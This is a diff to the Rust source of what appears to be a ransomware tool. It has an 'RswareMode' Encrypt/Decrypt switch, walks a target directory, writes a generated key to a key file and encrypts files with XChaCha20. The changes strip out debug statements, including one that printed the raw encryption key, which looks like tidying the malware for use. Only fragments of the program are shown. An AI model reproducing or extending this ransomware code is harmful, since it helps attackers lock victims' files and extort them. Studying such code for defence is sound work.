@@ -46,12 +46,9 @@ fn main() -> IDFC<()> {
 
 	let entries = WalkDir::new(target_dir);
 
-	dbg!(&mode);
-
 	match mode {
 		RswareMode::Encrypt	=> {
 			let key = SecretKey::default();
-			dbg!(&key.unprotected_as_bytes());
 			fs::write(keyfile_loc, key.unprotected_as_bytes())?;
 
 			// encrypt shit :P
@@ -127,8 +124,6 @@ fn decrypt_file(path: &Path, key: &SecretKey) -> IDFC<()> {
 	decrypted_path.truncate(decrypted_path.len() - ENCRYPTED_EXTENSION.len());
 	let decrypted_path = decrypted_path;
 
-	dbg!(&file_name, &decrypted_path);
-
 	// Prepare new file data
 	let content = fs::read(&path)?;
 	let plaintext = decrypt_xchacha20(&content[..], &key)?;
@@ -149,14 +144,10 @@ fn encrypt_xchacha20(src: &[u8], key: &SecretKey) -> IDFC<Vec<u8>> {
 }
 
 fn decrypt_xchacha20(src: &[u8], key: &SecretKey) -> IDFC<Vec<u8>> {
-	dbg!(&src, &key);
-
 	let decrypted = aead::open(
 		&key,
 		src
 	)?;
-
-	dbg!(&decrypted);
 
 	Ok(decrypted)
 }
